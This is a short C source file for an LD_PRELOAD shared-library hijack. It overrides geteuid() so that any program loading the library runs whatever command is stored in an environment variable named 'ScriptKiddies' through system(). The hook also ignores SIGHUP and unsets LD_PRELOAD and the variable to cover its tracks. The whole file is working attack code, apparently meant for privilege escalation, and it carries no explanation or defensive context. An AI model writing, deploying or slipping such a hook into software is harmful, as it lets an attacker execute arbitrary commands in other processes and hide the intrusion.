#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <unistd.h>
#include <signal.h>

void pwn() {
	char *cmd = getenv("ScriptKiddies");

	signal(SIGHUP, SIG_IGN);
	system(cmd);
}

uid_t geteuid() {
	uid_t (*orig_geteuid)();
	orig_geteuid = dlsym(RTLD_NEXT, "geteuid");
	unsetenv("LD_PRELOAD");
	pwn();
	unsetenv("ScriptKiddies");
	return orig_geteuid();
}
